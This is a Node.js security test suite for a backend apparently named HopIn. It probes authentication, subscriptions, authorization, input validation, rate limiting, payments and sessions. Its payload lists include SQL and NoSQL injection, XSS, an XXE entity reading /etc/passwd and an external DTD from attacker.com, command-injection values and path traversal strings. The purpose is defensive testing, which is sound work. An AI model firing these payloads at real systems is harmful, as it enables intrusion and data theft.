/**
 * Comprehensive Security Test Suite for HopIn Backend
 *
 * This test suite evaluates the security implementations including:
 * - Authentication and Authorization
 * - Subscription enforcement
 * - Rate limiting
 * - Input validation
 * - Payment security
 * - Session management
 */

import fetch from "node-fetch";
import crypto from "crypto";

const BASE_URL = process.env.TEST_BASE_URL || "http://localhost:8080";
const TEST_CONFIG = {
  timeout: 30000,
  maxRetries: 3,
  delayBetweenTests: 100,
};

// Test results tracking
let testResults = {
  passed: 0,
  failed: 0,
  critical: 0,
  details: [],
};

// Color coding for console output
const colors = {
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  reset: "\x1b[0m",
  bold: "\x1b[1m",
};

/**
 * Utility Functions
 */
function log(message, color = "reset") {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

function logTest(testName, status, severity = "normal") {
  const statusColor = status === "PASS" ? "green" : "red";
  const severityMarker = severity === "critical" ? " 🔥 CRITICAL" : "";
  log(`${testName}: ${status}${severityMarker}`, statusColor);

  testResults.details.push({ testName, status, severity });
  if (status === "PASS") testResults.passed++;
  else {
    testResults.failed++;
    if (severity === "critical") testResults.critical++;
  }
}

async function makeRequest(url, options = {}) {
  try {
    const response = await fetch(url, {
      ...options,
      timeout: TEST_CONFIG.timeout,
    });
    return {
      status: response.status,
      headers: response.headers,
      data: response.headers.get("content-type")?.includes("application/json")
        ? await response.json()
        : await response.text(),
    };
  } catch (error) {
    return { error: error.message };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * Authentication Test Data
 */
const testUsers = {
  validUser: {
    email: "test@security.com",
    password: "SecurePass123!", // Updated to meet validation requirements
    name: "Security Test User",
  },
  invalidUser: {
    email: "invalid@test.com",
    password: "wrongpassword",
    name: "Invalid User",
  },
  subscriptionUser: {
    email: "subscribed@security.com",
    password: "SubscribedUser123!", // Updated to meet validation requirements
    name: "Subscribed User",
  },
};

/**
 * Security Test Suite Implementation
 */

/**
 * 1. Authentication Security Tests
 */
async function testAuthenticationSecurity() {
  log("\n=== AUTHENTICATION SECURITY TESTS ===", "bold");

  // Test 1.1: SQL Injection in login
  await testSQLInjectionLogin();

  // Test 1.2: Brute force protection
  await testBruteForceProtection();

  // Test 1.3: JWT token validation
  await testJWTSecurity();

  // Test 1.4: Password requirements
  await testPasswordSecurity();

  // Test 1.5: Email validation bypass
  await testEmailValidationBypass();

  // Test 1.6: Session fixation
  await testSessionFixation();
}

async function testSQLInjectionLogin() {
  const maliciousPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 1=1 #",
  ];

  for (const payload of maliciousPayloads) {
    const response = await makeRequest(`${BASE_URL}/api/auth/signin`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: payload,
        password: "anypassword",
      }),
    });

    if (response.status === 200 || response.data?.accessToken) {
      logTest("SQL Injection Protection", "FAIL", "critical");
      return;
    }
  }
  logTest("SQL Injection Protection", "PASS");
}

async function testBruteForceProtection() {
  const attempts = [];

  // Make 15 rapid login attempts (should trigger rate limiting)
  for (let i = 0; i < 15; i++) {
    attempts.push(
      makeRequest(`${BASE_URL}/api/auth/signin`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: "brute@force.test",
          password: "wrongpassword" + i,
        }),
      }),
    );
  }

  const responses = await Promise.all(attempts);
  const rateLimitedResponses = responses.filter((r) => r.status === 429);

  if (rateLimitedResponses.length >= 5) {
    logTest("Brute Force Protection", "PASS");
  } else {
    logTest("Brute Force Protection", "FAIL", "critical");
  }
}

async function testJWTSecurity() {
  // Test with malformed JWT tokens
  const maliciousTokens = [
    "Bearer malformed.jwt.token",
    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature",
    "Bearer " + "A".repeat(1000), // Extremely long token
    "Bearer null",
    "Bearer undefined",
  ];

  let securityPassed = true;

  for (const token of maliciousTokens) {
    const response = await makeRequest(`${BASE_URL}/api/auth/me`, {
      method: "GET",
      headers: { Authorization: token },
    });

    if (response.status === 200) {
      securityPassed = false;
      break;
    }
  }

  logTest(
    "JWT Security Validation",
    securityPassed ? "PASS" : "FAIL",
    "critical",
  );
}

async function testPasswordSecurity() {
  const weakPasswords = ["123", "password", "abc", "12345678", "qwerty"];

  let rejectedWeakPasswords = 0;

  for (const password of weakPasswords) {
    const response = await makeRequest(`${BASE_URL}/api/auth/signup`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: `weak${Date.now()}@test.com`,
        password: password,
        name: "Weak Password Test",
      }),
    });

    if (response.status !== 201) {
      rejectedWeakPasswords++;
    }
  }

  logTest(
    "Password Strength Enforcement",
    rejectedWeakPasswords >= 3 ? "PASS" : "FAIL",
    "critical",
  );
}

async function testEmailValidationBypass() {
  const invalidEmails = [
    "notanemail",
    "@domain.com",
    "test@",
    "test..test@domain.com",
    "test@domain",
    '<script>alert("xss")</script>@domain.com',
  ];

  let invalidEmailsRejected = 0;

  for (const email of invalidEmails) {
    const response = await makeRequest(`${BASE_URL}/api/auth/signup`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: email,
        password: "ValidPassword123!",
        name: "Email Test",
      }),
    });

    if (response.status !== 201) {
      invalidEmailsRejected++;
    }
  }

  logTest("Email Validation", invalidEmailsRejected >= 4 ? "PASS" : "FAIL");
}

async function testSessionFixation() {
  // Test if the same token is returned for multiple logins
  const user = {
    email: `session-test-${Date.now()}@security.com`,
    password: "SecurePass123!",
    name: "Session Test User",
  };

  // First, create the user
  const signupResponse = await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });

  if (signupResponse.status !== 201) {
    logTest(
      "Session Fixation Protection - Setup",
      "FAIL",
      "normal",
      `Signup failed: ${signupResponse.status}`,
    );
    return;
  }

  // Wait a moment to ensure different timestamps
  await sleep(100);

  // Login twice
  const login1 = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  await sleep(100); // Ensure different timestamps

  const login2 = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token1 = login1.data?.accessToken;
  const token2 = login2.data?.accessToken;

  if (!token1 || !token2) {
    logTest(
      "Session Fixation Protection",
      "FAIL",
      "normal",
      "Failed to get tokens",
    );
    return;
  }

  const differentTokens = token1 !== token2;
  logTest(
    "Session Fixation Protection",
    differentTokens ? "PASS" : "FAIL",
    "normal",
    `Tokens different: ${differentTokens}`,
  );
}

/**
 * 2. Subscription Security Tests
 */
async function testSubscriptionSecurity() {
  log("\n=== SUBSCRIPTION SECURITY TESTS ===", "bold");

  // Test 2.1: Access without subscription
  await testAccessWithoutSubscription();

  // Test 2.2: Subscription status manipulation
  await testSubscriptionStatusManipulation();

  // Test 2.3: Payment bypass attempts
  await testPaymentBypass();

  // Test 2.4: Subscription validation
  await testSubscriptionValidation();
}

async function testAccessWithoutSubscription() {
  // Create a user without subscription
  const user = {
    email: `test-${Date.now()}@security.com`, // Unique email to avoid conflicts
    password: "SecurePass123!",
    name: "Security Test User",
  };

  const signupResponse = await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });

  if (signupResponse.status !== 201) {
    logTest(
      "Access Without Subscription - Setup",
      "FAIL",
      "critical",
      `Signup failed: ${signupResponse.status} - ${JSON.stringify(signupResponse.data)}`,
    );
    return;
  }

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  if (!token) {
    logTest(
      "Access Without Subscription - Login",
      "FAIL",
      "critical",
      `Login failed: ${loginResponse.status} - ${JSON.stringify(loginResponse.data)}`,
    );
    return;
  }

  // Try to access subscription-required endpoints
  const protectedEndpoints = [
    "/api/users",
    "/api/subscriptions/checkout-subscription",
  ];

  let accessBlocked = true;
  let accessDetails = [];

  for (const endpoint of protectedEndpoints) {
    const response = await makeRequest(`${BASE_URL}${endpoint}`, {
      method: "GET",
      headers: { Authorization: `Bearer ${token}` },
    });

    accessDetails.push(`${endpoint}: ${response.status}`);

    // Check if middleware blocks access based on subscription
    if (response.status === 200) {
      accessBlocked = false;
      break;
    }
  }

  logTest(
    "Access Control Without Subscription",
    accessBlocked ? "PASS" : "FAIL",
    "critical",
    `Endpoint access: ${accessDetails.join(", ")}`,
  );
}

async function testSubscriptionStatusManipulation() {
  // Try to manipulate subscription status through API calls
  const user = testUsers.validUser;

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  const userId = loginResponse.data?.id;

  if (!token) return;

  // Try to directly modify subscription status
  const manipulationAttempts = [
    {
      method: "PATCH",
      endpoint: `/api/users/${userId}`,
      body: { subscription: { status: "active" } },
    },
    {
      method: "POST",
      endpoint: `/api/users/${userId}/subscription-status`,
      body: { status: "active" },
    },
  ];

  let manipulationBlocked = true;
  for (const attempt of manipulationAttempts) {
    const response = await makeRequest(`${BASE_URL}${attempt.endpoint}`, {
      method: attempt.method,
      headers: {
        Authorization: `Bearer ${token}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(attempt.body),
    });

    if (
      response.status === 200 &&
      response.data?.subscription?.status === "active"
    ) {
      manipulationBlocked = false;
      break;
    }
  }

  logTest(
    "Subscription Status Manipulation Protection",
    manipulationBlocked ? "PASS" : "FAIL",
    "critical",
  );
}

async function testPaymentBypass() {
  // Test various payment bypass attempts
  const user = testUsers.validUser;

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  if (!token) return;

  // Try to create subscription without payment
  const bypassAttempts = [
    {
      plan: "free",
      amount: 0,
    },
    {
      plan: "monthly",
      bypass: true,
    },
    {
      plan: "../../../admin",
      injection: true,
    },
  ];

  let bypassBlocked = true;
  for (const attempt of bypassAttempts) {
    const response = await makeRequest(
      `${BASE_URL}/api/subscriptions/checkout-subscription`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(attempt),
      },
    );

    // If any bypass attempt succeeds without proper Stripe integration
    if (response.status === 200 && !response.data?.url?.includes("stripe")) {
      bypassBlocked = false;
      break;
    }
  }

  logTest(
    "Payment Bypass Protection",
    bypassBlocked ? "PASS" : "FAIL",
    "critical",
  );
}

async function testSubscriptionValidation() {
  // Test subscription validation logic
  const user = testUsers.validUser;

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  const userId = loginResponse.data?.id;

  if (!token || !userId) return;

  // Test subscription status endpoint
  const statusResponse = await makeRequest(
    `${BASE_URL}/api/users/${userId}/subscription-status`,
    {
      method: "GET",
      headers: { Authorization: `Bearer ${token}` },
    },
  );

  const hasValidResponse =
    statusResponse.status === 200 &&
    statusResponse.data?.subscriptionStatus !== undefined;

  logTest("Subscription Status Validation", hasValidResponse ? "PASS" : "FAIL");
}

/**
 * 3. Authorization and Access Control Tests
 */
async function testAuthorizationSecurity() {
  log("\n=== AUTHORIZATION SECURITY TESTS ===", "bold");

  await testUnauthorizedAccess();
  await testPrivilegeEscalation();
  await testCrossUserAccess();
  await testAdminEndpointAccess();
}

async function testUnauthorizedAccess() {
  const protectedEndpoints = [
    { path: "/api/auth/me", method: "GET" },
    { path: "/api/users", method: "GET" },
    { path: "/api/subscriptions/checkout-subscription", method: "POST" },
    { path: "/api/auth/signout", method: "POST" },
  ];

  let unauthorizedBlocked = true;
  for (const endpoint of protectedEndpoints) {
    const response = await makeRequest(`${BASE_URL}${endpoint.path}`, {
      method: endpoint.method,
      headers: { "Content-Type": "application/json" },
    });

    if (response.status === 200) {
      unauthorizedBlocked = false;
      break;
    }
  }

  logTest(
    "Unauthorized Access Protection",
    unauthorizedBlocked ? "PASS" : "FAIL",
    "critical",
  );
}

async function testPrivilegeEscalation() {
  // Create two users
  const user1 = { ...testUsers.validUser, email: "user1@privilege.test" };
  const user2 = { ...testUsers.validUser, email: "user2@privilege.test" };

  // Create users
  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user1),
  });

  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user2),
  });

  // Login as user1
  const login1 = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user1.email,
      password: user1.password,
    }),
  });

  // Login as user2
  const login2 = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user2.email,
      password: user2.password,
    }),
  });

  const token1 = login1.data?.accessToken;
  const userId2 = login2.data?.id;

  if (!token1 || !userId2) return;

  // Try to access user2's data with user1's token
  const accessAttempt = await makeRequest(`${BASE_URL}/api/users/${userId2}`, {
    method: "PATCH",
    headers: {
      Authorization: `Bearer ${token1}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ name: "Hacked Name" }),
  });

  logTest(
    "Privilege Escalation Protection",
    accessAttempt.status !== 200 ? "PASS" : "FAIL",
    "critical",
  );
}

async function testCrossUserAccess() {
  // Test if users can access other users' sensitive data
  const user1 = { ...testUsers.validUser, email: "cross1@test.com" };
  const user2 = { ...testUsers.validUser, email: "cross2@test.com" };

  // Setup users
  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user1),
  });

  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user2),
  });

  const login1 = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user1.email,
      password: user1.password,
    }),
  });

  const login2 = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user2.email,
      password: user2.password,
    }),
  });

  const token1 = login1.data?.accessToken;
  const userId2 = login2.data?.id;

  if (!token1 || !userId2) return;

  // Try to access user2's subscription status with user1's token
  const crossAccess = await makeRequest(
    `${BASE_URL}/api/users/${userId2}/subscription-status`,
    {
      method: "GET",
      headers: { Authorization: `Bearer ${token1}` },
    },
  );

  logTest(
    "Cross-User Access Protection",
    crossAccess.status !== 200 ? "PASS" : "FAIL",
    "critical",
  );
}

async function testAdminEndpointAccess() {
  // Test access to potential admin endpoints
  const user = testUsers.validUser;

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  if (!token) return;

  const adminEndpoints = [
    "/api/admin",
    "/api/admin/users",
    "/api/webhooks",
    "/api/debug",
    "/api/config",
  ];

  let adminAccessBlocked = true;
  for (const endpoint of adminEndpoints) {
    const response = await makeRequest(`${BASE_URL}${endpoint}`, {
      method: "GET",
      headers: { Authorization: `Bearer ${token}` },
    });

    if (response.status === 200) {
      adminAccessBlocked = false;
      break;
    }
  }

  logTest(
    "Admin Endpoint Protection",
    adminAccessBlocked ? "PASS" : "FAIL",
    "critical",
  );
}

/**
 * 4. Input Validation and Sanitization Tests
 */
async function testInputValidation() {
  log("\n=== INPUT VALIDATION TESTS ===", "bold");

  await testXSSPrevention();
  await testXMLInjection();
  await testPathTraversal();
  await testCommandInjection();
  await testNoSQLInjection();
}

async function testXSSPrevention() {
  const xssPayloads = [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src="x" onerror="alert(\'xss\')">',
    '"><script>alert("xss")</script>',
    "<svg onload=\"alert('xss')\">",
    '${alert("xss")}',
  ];

  let xssBlocked = true;
  for (const payload of xssPayloads) {
    const response = await makeRequest(`${BASE_URL}/api/auth/signup`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: "xss@test.com",
        password: "ValidPassword123!",
        name: payload,
      }),
    });

    // Check if XSS payload is reflected or stored
    if (
      response.status === 201 &&
      response.data?.user?.name?.includes("<script>")
    ) {
      xssBlocked = false;
      break;
    }
  }

  logTest("XSS Prevention", xssBlocked ? "PASS" : "FAIL", "critical");
}

async function testXMLInjection() {
  const xmlPayloads = [
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY test SYSTEM "file:///etc/passwd">]><test>&test;</test>',
    '<!DOCTYPE test [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>',
    '<root><![CDATA[<script>alert("xss")</script>]]></root>',
  ];

  let xmlBlocked = true;
  for (const payload of xmlPayloads) {
    const response = await makeRequest(`${BASE_URL}/api/auth/signup`, {
      method: "POST",
      headers: { "Content-Type": "application/xml" },
      body: payload,
    });

    if (response.status === 201) {
      xmlBlocked = false;
      break;
    }
  }

  logTest("XML Injection Prevention", xmlBlocked ? "PASS" : "FAIL");
}

async function testPathTraversal() {
  const pathPayloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc//passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  ];

  let pathBlocked = true;
  for (const payload of pathPayloads) {
    const response = await makeRequest(
      `${BASE_URL}/uploads/avatars/${payload}`,
      {
        method: "GET",
      },
    );

    if (response.status === 200 && response.data?.includes("root:")) {
      pathBlocked = false;
      break;
    }
  }

  logTest(
    "Path Traversal Prevention",
    pathBlocked ? "PASS" : "FAIL",
    "critical",
  );
}

async function testCommandInjection() {
  const commandPayloads = [
    "; ls -la",
    "| whoami",
    '& echo "injected"',
    "$(cat /etc/passwd)",
    "`id`",
  ];

  let commandBlocked = true;
  for (const payload of commandPayloads) {
    const response = await makeRequest(`${BASE_URL}/api/auth/signup`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: "cmd@test.com",
        password: "ValidPassword123!",
        name: payload,
      }),
    });

    // Check if command output is returned
    if (
      response.status === 201 &&
      (response.data?.includes("uid=") || response.data?.includes("injected"))
    ) {
      commandBlocked = false;
      break;
    }
  }

  logTest(
    "Command Injection Prevention",
    commandBlocked ? "PASS" : "FAIL",
    "critical",
  );
}

async function testNoSQLInjection() {
  const noSQLPayloads = [
    { $ne: null },
    { $gt: "" },
    { $regex: ".*" },
    { $where: "this.password" },
  ];

  let noSQLBlocked = true;
  for (const payload of noSQLPayloads) {
    const response = await makeRequest(`${BASE_URL}/api/auth/signin`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: payload,
        password: payload,
      }),
    });

    if (response.status === 200 && response.data?.accessToken) {
      noSQLBlocked = false;
      break;
    }
  }

  logTest(
    "NoSQL Injection Prevention",
    noSQLBlocked ? "PASS" : "FAIL",
    "critical",
  );
}

/**
 * 5. Rate Limiting Tests
 */
async function testRateLimiting() {
  log("\n=== RATE LIMITING TESTS ===", "bold");

  await testLoginRateLimit();
  await testAPIRateLimit();
  await testSubscriptionRateLimit();
}

async function testLoginRateLimit() {
  const requests = [];

  // Generate 20 rapid login attempts
  for (let i = 0; i < 20; i++) {
    requests.push(
      makeRequest(`${BASE_URL}/api/auth/signin`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: "ratelimit@test.com",
          password: "wrongpassword" + i,
        }),
      }),
    );
  }

  const responses = await Promise.all(requests);
  const rateLimitedCount = responses.filter((r) => r.status === 429).length;

  logTest(
    "Login Rate Limiting",
    rateLimitedCount >= 10 ? "PASS" : "FAIL",
    "critical",
  );
}

async function testAPIRateLimit() {
  // Create and login user first
  const user = { ...testUsers.validUser, email: "apirate@test.com" };

  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  if (!token) return;

  // Generate rapid API requests
  const requests = [];
  for (let i = 0; i < 50; i++) {
    requests.push(
      makeRequest(`${BASE_URL}/api/auth/me`, {
        method: "GET",
        headers: { Authorization: `Bearer ${token}` },
      }),
    );
  }

  const responses = await Promise.all(requests);
  const rateLimitedCount = responses.filter((r) => r.status === 429).length;

  logTest("API Rate Limiting", rateLimitedCount >= 5 ? "PASS" : "FAIL");
}

async function testSubscriptionRateLimit() {
  const user = { ...testUsers.validUser, email: "subrate@test.com" };

  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  if (!token) return;

  // Try multiple subscription checkout attempts
  const requests = [];
  for (let i = 0; i < 10; i++) {
    requests.push(
      makeRequest(`${BASE_URL}/api/subscriptions/checkout-subscription`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ plan: "monthly" }),
      }),
    );
  }

  const responses = await Promise.all(requests);
  const rateLimitedCount = responses.filter((r) => r.status === 429).length;

  logTest(
    "Subscription Rate Limiting",
    rateLimitedCount >= 3 ? "PASS" : "FAIL",
  );
}

/**
 * 6. Payment Security Tests
 */
async function testPaymentSecurity() {
  log("\n=== PAYMENT SECURITY TESTS ===", "bold");

  await testStripeWebhookSecurity();
  await testPaymentDataValidation();
  await testDoubleSpendingPrevention();
}

async function testStripeWebhookSecurity() {
  // Test webhook without proper signature
  const fakeWebhookData = {
    id: "evt_test_webhook",
    object: "event",
    type: "customer.subscription.updated",
    data: {
      object: {
        id: "sub_test",
        customer: "cus_test",
        status: "active",
        metadata: { userId: "fake_user_id" },
      },
    },
  };

  const response = await makeRequest(`${BASE_URL}/api/webhooks`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "stripe-signature": "fake_signature",
    },
    body: JSON.stringify(fakeWebhookData),
  });

  logTest(
    "Webhook Signature Verification",
    response.status !== 200 ? "PASS" : "FAIL",
    "critical",
  );
}

async function testPaymentDataValidation() {
  const user = { ...testUsers.validUser, email: "payment@test.com" };

  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  if (!token) return;

  // Test invalid payment plans
  const invalidPlans = [
    "free",
    "admin",
    "../../../etc/passwd",
    { $ne: null },
    '<script>alert("xss")</script>',
  ];

  let invalidPlansRejected = 0;
  for (const plan of invalidPlans) {
    const response = await makeRequest(
      `${BASE_URL}/api/subscriptions/checkout-subscription`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ plan }),
      },
    );

    if (response.status !== 200) {
      invalidPlansRejected++;
    }
  }

  logTest(
    "Payment Plan Validation",
    invalidPlansRejected >= 3 ? "PASS" : "FAIL",
  );
}

async function testDoubleSpendingPrevention() {
  const user = { ...testUsers.validUser, email: "doublespend@test.com" };

  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  if (!token) return;

  // Try multiple simultaneous subscription purchases
  const requests = [];
  for (let i = 0; i < 5; i++) {
    requests.push(
      makeRequest(`${BASE_URL}/api/subscriptions/checkout-subscription`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ plan: "monthly" }),
      }),
    );
  }

  const responses = await Promise.all(requests);
  const successfulRequests = responses.filter((r) => r.status === 200).length;

  // Should only allow one successful subscription purchase
  logTest(
    "Double Spending Prevention",
    successfulRequests <= 1 ? "PASS" : "FAIL",
    "critical",
  );
}

/**
 * 7. Session and Token Management Tests
 */
async function testSessionSecurity() {
  log("\n=== SESSION SECURITY TESTS ===", "bold");

  await testTokenExpiry();
  await testTokenBlacklisting();
  await testConcurrentSessions();
}

async function testTokenExpiry() {
  // This would require manipulating token expiry or waiting
  // For testing purposes, we'll test with malformed expired tokens
  const expiredToken =
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid";

  const response = await makeRequest(`${BASE_URL}/api/auth/me`, {
    method: "GET",
    headers: { Authorization: `Bearer ${expiredToken}` },
  });

  logTest("Token Expiry Handling", response.status !== 200 ? "PASS" : "FAIL");
}

async function testTokenBlacklisting() {
  const user = { ...testUsers.validUser, email: "blacklist@test.com" };

  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });

  const loginResponse = await makeRequest(`${BASE_URL}/api/auth/signin`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email: user.email,
      password: user.password,
    }),
  });

  const token = loginResponse.data?.accessToken;
  if (!token) return;

  // Logout (should blacklist token)
  await makeRequest(`${BASE_URL}/api/auth/signout`, {
    method: "POST",
    headers: { Authorization: `Bearer ${token}` },
  });

  // Try to use the token after logout
  const afterLogout = await makeRequest(`${BASE_URL}/api/auth/me`, {
    method: "GET",
    headers: { Authorization: `Bearer ${token}` },
  });

  logTest(
    "Token Blacklisting",
    afterLogout.status !== 200 ? "PASS" : "FAIL",
    "critical",
  );
}

async function testConcurrentSessions() {
  const user = { ...testUsers.validUser, email: "concurrent@test.com" };

  await makeRequest(`${BASE_URL}/api/auth/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(user),
  });

  // Login from multiple "devices"
  const logins = [];
  for (let i = 0; i < 3; i++) {
    logins.push(
      makeRequest(`${BASE_URL}/api/auth/signin`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: user.email,
          password: user.password,
        }),
      }),
    );
  }

  const responses = await Promise.all(logins);
  const tokens = responses.map((r) => r.data?.accessToken).filter(Boolean);

  // Test if all tokens are valid
  const validations = await Promise.all(
    tokens.map((token) =>
      makeRequest(`${BASE_URL}/api/auth/me`, {
        method: "GET",
        headers: { Authorization: `Bearer ${token}` },
      }),
    ),
  );

  const validTokens = validations.filter((v) => v.status === 200).length;

  logTest(
    "Concurrent Session Management",
    validTokens === tokens.length ? "PASS" : "FAIL",
  );
}

/**
 * Main Test Runner
 */
async function runSecurityTests() {
  log("🔒 HOPIN BACKEND SECURITY TEST SUITE", "bold");
  log("=====================================", "cyan");
  log(`Testing against: ${BASE_URL}`, "blue");
  log(`Started at: ${new Date().toISOString()}`, "blue");

  try {
    await testAuthenticationSecurity();
    await sleep(TEST_CONFIG.delayBetweenTests);

    await testSubscriptionSecurity();
    await sleep(TEST_CONFIG.delayBetweenTests);

    await testAuthorizationSecurity();
    await sleep(TEST_CONFIG.delayBetweenTests);

    await testInputValidation();
    await sleep(TEST_CONFIG.delayBetweenTests);

    await testRateLimiting();
    await sleep(TEST_CONFIG.delayBetweenTests);

    await testPaymentSecurity();
    await sleep(TEST_CONFIG.delayBetweenTests);

    await testSessionSecurity();
  } catch (error) {
    log(`\nTest suite error: ${error.message}`, "red");
  }

  // Final Results
  log("\n📊 SECURITY TEST RESULTS", "bold");
  log("========================", "cyan");
  log(`Total Tests: ${testResults.passed + testResults.failed}`, "blue");
  log(`Passed: ${testResults.passed}`, "green");
  log(`Failed: ${testResults.failed}`, "red");
  log(`Critical Failures: ${testResults.critical}`, "magenta");

  const successRate = (
    (testResults.passed / (testResults.passed + testResults.failed)) *
    100
  ).toFixed(1);
  log(`Success Rate: ${successRate}%`, successRate > 80 ? "green" : "red");

  if (testResults.critical > 0) {
